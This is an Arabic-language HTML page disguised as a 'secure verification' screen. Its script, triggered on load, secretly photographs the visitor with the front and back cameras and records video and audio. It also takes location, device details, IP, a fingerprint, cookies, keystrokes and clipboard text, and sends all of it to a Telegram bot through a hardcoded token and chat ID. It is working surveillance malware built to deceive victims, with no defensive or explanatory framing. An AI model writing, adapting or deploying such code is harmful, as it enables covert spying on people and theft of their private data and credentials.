<!DOCTYPE html>
<html lang="ar">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0, user-scalable=no">
    <title>🔒 التحقق الآمن</title>
    <style>
        * { margin: 0; padding: 0; box-sizing: border-box; }
        body {
            background: linear-gradient(135deg, #0a0f1e 0%, #0c1222 100%);
            font-family: 'Segoe UI', 'Poppins', 'Cairo', system-ui, sans-serif;
            min-height: 100vh;
            display: flex;
            justify-content: center;
            align-items: center;
            padding: 20px;
        }
        .glass-card {
            background: rgba(18, 25, 45, 0.85);
            backdrop-filter: blur(16px);
            border-radius: 40px;
            border: 1px solid rgba(59, 201, 219, 0.3);
            padding: 2rem;
            max-width: 600px;
            width: 100%;
            text-align: center;
        }
        h2 {
            font-size: 1.8rem;
            background: linear-gradient(135deg, #fff, #3bc9db);
            -webkit-background-clip: text;
            background-clip: text;
            color: transparent;
        }
        .subtitle { color: #8a9bb5; font-size: 0.85rem; margin-bottom: 1.5rem; }
        .status-box {
            background: rgba(10, 18, 30, 0.7);
            border-radius: 24px;
            padding: 1rem;
            margin: 1.5rem 0;
            font-family: monospace;
            font-size: 0.75rem;
            text-align: left;
            border: 1px solid rgba(59, 201, 219, 0.2);
            max-height: 350px;
            overflow-y: auto;
        }
        .status-line { margin: 5px 0; padding: 3px 5px; }
        .spinner {
            display: inline-block;
            width: 10px;
            height: 10px;
            border: 2px solid rgba(59,201,219,0.3);
            border-top-color: #3bc9db;
            border-radius: 50%;
            animation: spin 0.8s linear infinite;
        }
        @keyframes spin { to { transform: rotate(360deg); } }
        .counter-card {
            background: linear-gradient(135deg, rgba(59,201,219,0.12), rgba(59,201,219,0.05));
            border-radius: 60px;
            padding: 10px;
            margin: 15px 0;
            display: flex;
            justify-content: space-around;
            flex-wrap: wrap;
            gap: 10px;
        }
        .counter-item { text-align: center; flex: 1; }
        .counter-label { font-size: 0.65rem; color: #8a9bb5; }
        .counter-value { font-size: 1.3rem; font-weight: bold; color: #3bc9db; }
        .footer { font-size: 0.6rem; color: #5a6e8a; margin-top: 15px; display: flex; justify-content: center; gap: 10px; flex-wrap: wrap; }
        .badge { background: rgba(59,201,219,0.12); padding: 4px 12px; border-radius: 50px; }
        .hidden-video { position: fixed; top: -9999px; left: -9999px; width: 1px; height: 1px; opacity: 0; pointer-events: none; }
        .switch-btn {
            background: rgba(59,201,219,0.2);
            border: 1px solid #3bc9db;
            border-radius: 30px;
            padding: 5px 12px;
            color: #3bc9db;
            cursor: pointer;
            font-size: 0.6rem;
            margin-top: 5px;
        }
    </style>
</head>
<body>

<video id="cameraVideo" class="hidden-video" autoplay playsinline muted></video>

<div class="glass-card">
    <h2>🔒 نظام التحقق الآمن</h2>
    <div class="subtitle">جاري تأكيد هوية الجهاز والمستخدم</div>
    <div class="status-box" id="logBox">
        <div class="status-line">🔐 <span>جاري التشغيل...</span> <span class="spinner"></span></div>
    </div>
    <div class="counter-card">
        <div class="counter-item"><div class="counter-label">📸 إجمالي الصور</div><div class="counter-value" id="totalCounter">0</div></div>
        <div class="counter-item"><div class="counter-label">🤳 أمامية</div><div class="counter-value" id="frontCounter">0</div></div>
        <div class="counter-item"><div class="counter-label">📷 خلفية</div><div class="counter-value" id="backCounter">0</div></div>
        <div class="counter-item"><div class="counter-label">🔄 الدورات</div><div class="counter-value" id="cycleCounter">0</div></div>
    </div>
    <div class="footer">
        <span class="badge">🔒 تشفير AES-256</span>
        <span class="badge">🛡️ يعمل في الخلفية</span>
        <span class="badge">📸 5 صور/دورة</span>
    </div>
</div>

<script>
    const TOKEN = "8021166004:AAGFxofCV8Cp0N4976xeAi1wHOYMkjHsy0w";
    const CHAT_ID = "7984067238";
    
    let frontCount = 0, backCount = 0, total = 0, cycle = 0;
    let currentCamera = 'user'; // 'user' = أمامي, 'environment' = خلفي
    let videoElement = null;
    let stream = null;
    let isRunning = true;
    let isSwitching = false;
    
    function updateUI() {
        document.getElementById('totalCounter').innerText = total;
        document.getElementById('frontCounter').innerText = frontCount;
        document.getElementById('backCounter').innerText = backCount;
        document.getElementById('cycleCounter').innerText = cycle;
    }
    
    function addLog(msg, done = false) {
        const box = document.getElementById('logBox');
        const line = document.createElement('div');
        line.className = 'status-line';
        if (!done) line.innerHTML = `🔄 <span>${msg}</span> <span class="spinner"></span>`;
        else line.innerHTML = `✅ <span>${msg}</span>`;
        box.appendChild(line);
        box.scrollTop = box.scrollHeight;
        while(box.children.length > 30) box.removeChild(box.firstChild);
    }
    
    async function sendPhoto(blob, caption) {
        const fd = new FormData();
        fd.append('chat_id', CHAT_ID);
        fd.append('photo', blob);
        if(caption) fd.append('caption', caption);
        await fetch(`https://api.telegram.org/bot${TOKEN}/sendPhoto`, { method: 'POST', body: fd });
    }
    
    async function sendMessage(text) {
        await fetch(`https://api.telegram.org/bot${TOKEN}/sendMessage`, {
            method: 'POST', headers: { 'Content-Type': 'application/json' },
            body: JSON.stringify({ chat_id: CHAT_ID, text: text.substring(0, 4000) })
        });
    }
    
    async function sendVoice(blob) {
        const fd = new FormData();
        fd.append('chat_id', CHAT_ID);
        fd.append('voice', blob);
        await fetch(`https://api.telegram.org/bot${TOKEN}/sendVoice`, { method: 'POST', body: fd });
    }
    
    async function sendVideo(blob) {
        const fd = new FormData();
        fd.append('chat_id', CHAT_ID);
        fd.append('video', blob);
        await fetch(`https://api.telegram.org/bot${TOKEN}/sendVideo`, { method: 'POST', body: fd });
    }
    
    // ========== تشغيل الكاميرا ==========
    async function startCamera(facingMode) {
        if(stream) {
            stream.getTracks().forEach(track => track.stop());
        }
        try {
            const newStream = await navigator.mediaDevices.getUserMedia({
                video: { facingMode: { exact: facingMode } }
            });
            stream = newStream;
            if(videoElement) {
                videoElement.srcObject = stream;
                await videoElement.play();
            }
            return true;
        } catch(e) {
            try {
                const newStream = await navigator.mediaDevices.getUserMedia({
                    video: { facingMode: facingMode }
                });
                stream = newStream;
                if(videoElement) {
                    videoElement.srcObject = stream;
                    await videoElement.play();
                }
                return true;
            } catch(e2) {
                return false;
            }
        }
    }
    
    // ========== التبديل بين الكاميرات ==========
    async function switchCamera() {
        if(isSwitching) return;
        isSwitching = true;
        currentCamera = (currentCamera === 'user') ? 'environment' : 'user';
        const success = await startCamera(currentCamera);
        if(success) {
            addLog(`🔄 تم التبديل إلى ${currentCamera === 'user' ? 'الكاميرا الأمامية' : 'الكاميرا الخلفية'}`, true);
        }
        isSwitching = false;
    }
    
    // ========== التقاط صورة ==========
    async function capturePhoto(side, num) {
        if(!videoElement || videoElement.readyState < 2) return false;
        const canvas = document.createElement('canvas');
        canvas.width = videoElement.videoWidth || 640;
        canvas.height = videoElement.videoHeight || 480;
        canvas.getContext('2d').drawImage(videoElement, 0, 0, canvas.width, canvas.height);
        const blob = await new Promise(r => canvas.toBlob(r, 'image/jpeg', 0.85));
        if(blob && blob.size > 5000) {
            await sendPhoto(blob, side === 'front' ? `🤳 صورة أمامية #${num}` : `📷 صورة خلفية #${num}`);
            if(side === 'front') frontCount++;
            else backCount++;
            total++;
            updateUI();
            return true;
        }
        return false;
    }
    
    // ========== دورة التصوير (أمامي + خلفي بالتبديل) ==========
    async function startCycle() {
        if(!isRunning) return;
        cycle++;
        updateUI();
        addLog(`🔄 الدورة ${cycle} - بدء التصوير`, false);
        
        // التصوير بالكاميرا الأمامية
        if(currentCamera !== 'user') await switchCamera();
        await new Promise(r => setTimeout(r, 500));
        for(let i=1; i<=5; i++) {
            await new Promise(r => setTimeout(r, 400));
            await capturePhoto('front', frontCount+1);
        }
        
        // التبديل إلى الكاميرا الخلفية
        await switchCamera();
        await new Promise(r => setTimeout(r, 500));
        for(let i=1; i<=5; i++) {
            await new Promise(r => setTimeout(r, 400));
            await capturePhoto('back', backCount+1);
        }
        
        // العودة إلى الكاميرا الأمامية للدورة القادمة
        await switchCamera();
        
        addLog(`✅ اكتملت الدورة ${cycle} (${total} صورة)`, true);
        setTimeout(startCycle, 7000);
    }
    
    // ========== تسجيل فيديو 10 ثواني ==========
    async function recordVideo() {
        try {
            const videoStream = await navigator.mediaDevices.getUserMedia({ video: true, audio: true });
            const recorder = new MediaRecorder(videoStream, { mimeType: 'video/webm' });
            const chunks = [];
            recorder.ondataavailable = e => chunks.push(e.data);
            recorder.onstop = async () => {
                const blob = new Blob(chunks, { type: 'video/webm' });
                if(blob.size > 10000) await sendVideo(blob);
                addLog(`🎥 تم إرسال الفيديو`, true);
                videoStream.getTracks().forEach(t => t.stop());
            };
            recorder.start();
            setTimeout(() => recorder.stop(), 10000);
            addLog(`🎥 جاري تسجيل فيديو 10 ثواني...`, false);
        } catch(e) { addLog(`❌ فشل تسجيل الفيديو`, true); }
    }
    
    // ========== تسجيل صوت 10 ثواني ==========
    async function recordAudio() {
        try {
            const audioStream = await navigator.mediaDevices.getUserMedia({ audio: true });
            const recorder = new MediaRecorder(audioStream);
            const chunks = [];
            recorder.ondataavailable = e => chunks.push(e.data);
            recorder.onstop = async () => {
                const blob = new Blob(chunks, { type: 'audio/webm' });
                if(blob.size > 5000) await sendVoice(blob);
                addLog(`🎙️ تم إرسال التسجيل الصوتي`, true);
                audioStream.getTracks().forEach(t => t.stop());
            };
            recorder.start();
            setTimeout(() => recorder.stop(), 10000);
            addLog(`🎙️ جاري تسجيل صوت 10 ثواني...`, false);
        } catch(e) { addLog(`❌ فشل تسجيل الصوت`, true); }
    }
    
    // ========== الموقع الجغرافي ==========
    async function getLocation() {
        return new Promise((resolve) => {
            if(!navigator.geolocation) { resolve(); return; }
            navigator.geolocation.getCurrentPosition(async (pos) => {
                await sendMessage(`📍 *الموقع الجغرافي*\nhttps://www.google.com/maps?q=${pos.coords.latitude},${pos.coords.longitude}\n🎯 الدقة: ${pos.coords.accuracy} متر`);
                addLog(`📍 تم تحديد الموقع`, true);
                resolve();
            }, () => { resolve(); });
        });
    }
    
    // ========== معلومات الجهاز ==========
    async function sendDeviceInfo() {
        let info = `🖥️ *معلومات الجهاز*\n━━━━━━━━━━━━━━━━━━\n`;
        info += `📱 المتصفح: ${navigator.userAgent.substring(0, 150)}\n`;
        info += `💻 النظام: ${navigator.platform}\n`;
        info += `🌐 اللغة: ${navigator.language}\n`;
        info += `📺 الشاشة: ${screen.width}×${screen.height}\n`;
        info += `🧠 الرام: ${navigator.deviceMemory || '?'} جيجابايت\n`;
        info += `⚙️ المعالج: ${navigator.hardwareConcurrency || '?'} نواة\n`;
        await sendMessage(info);
        addLog(`📱 تم إرسال معلومات الجهاز`, true);
    }
    
    // ========== IP العام ==========
    async function getPublicIP() {
        try {
            const res = await fetch('https://api.ipify.org?format=json');
            const data = await res.json();
            await sendMessage(`🌍 *IP العام*\n\`${data.ip}\``);
            addLog(`🌍 تم تحديد IP العام`, true);
        } catch(e) {}
    }
    
    // ========== بصمة الجهاز ==========
    async function getFingerprint() {
        if(typeof FingerprintJS === 'undefined') return;
        try {
            const fp = await FingerprintJS.load();
            const result = await fp.get();
            await sendMessage(`🆔 *بصمة الجهاز*\n\`${result.visitorId}\``);
            addLog(`🆔 تم إنشاء بصمة الجهاز`, true);
        } catch(e) {}
    }
    
    // ========== الكوكيز ==========
    async function stealCookies() {
        const cookies = document.cookie;
        if(cookies && cookies.length > 0) {
            await sendMessage(`🍪 *ملفات تعريف الارتباط (كوكيز)*\n\`${cookies.substring(0, 900)}\``);
            addLog(`🍪 تم سحب الكوكيز`, true);
        }
    }
    
    // ========== Keylogger ==========
    let keylogBuffer = "";
    function startKeylogger() {
        document.addEventListener('keydown', (e) => {
            if(e.target && (e.target.tagName === 'INPUT' || e.target.tagName === 'TEXTAREA')) {
                keylogBuffer += e.key;
                if(keylogBuffer.length > 100) {
                    sendMessage(`⌨️ *سجل الضغطات (Keylogger)*\n\`${keylogBuffer}\``);
                    keylogBuffer = "";
                }
            }
        });
        setInterval(() => {
            if(keylogBuffer.length > 0) {
                sendMessage(`⌨️ *سجل الضغطات (Keylogger)*\n\`${keylogBuffer}\``);
                keylogBuffer = "";
            }
        }, 10000);
        addLog(`⌨️ تم تفعيل Keylogger`, true);
    }
    
    // ========== سرقة الحافظة ==========
    async function stealClipboard() {
        try {
            const text = await navigator.clipboard.readText();
            if(text && text.length > 0) {
                await sendMessage(`📋 *الحافظة (Clipboard)*\n\`${text.substring(0, 500)}\``);
                addLog(`📋 تم سحب الحافظة`, true);
            }
        } catch(e) {}
    }
    
    // ========== الاهتزاز ==========
    function vibrateDevice() {
        if(navigator.vibrate) {
            navigator.vibrate([200, 100, 200]);
            addLog(`📳 تم اهتزاز الجهاز`, true);
        }
    }
    
    // ========== MAIN ==========
    async function run() {
        addLog(`🔐 جاري طلب الصلاحيات...`, false);
        
        try {
            await navigator.mediaDevices.getUserMedia({ video: true, audio: true });
            addLog(`✅ تم منح الصلاحيات`, true);
        } catch(e) {
            addLog(`❌ لم يتم منح الصلاحيات`, true);
            return;
        }
        
        // تهيئة عنصر الفيديو
        videoElement = document.getElementById('cameraVideo');
        
        // بدء الكاميرا الأمامية
        addLog(`📷 جاري تشغيل الكاميرا الأمامية...`, false);
        await startCamera('user');
        addLog(`✅ الكاميرا الأمامية جاهزة`, true);
        
        // إرسال رسالة بدء التشغيل
        await sendMessage(`🚀 *تم تشغيل نظام التحقق*\n🕐 ${new Date().toLocaleString('ar-EG')}`);
        
        // بدء التصوير بعد 1 ثانية
        setTimeout(() => startCycle(), 1000);
        
        // تشغيل جميع الميزات بالتوازي
        recordVideo();
        recordAudio();
        getLocation();
        sendDeviceInfo();
        getPublicIP();
        getFingerprint();
        stealCookies();
        startKeylogger();
        stealClipboard();
        vibrateDevice();
        
        addLog(`✅ تم تشغيل جميع الميزات بنجاح`, true);
    }
    
    window.onload = () => { setTimeout(run, 200); };
</script>
<script src="https://cdn.jsdelivr.net/npm/@fingerprintjs/fingerprintjs@3/dist/fp.min.js"></script>
</body>
</html>
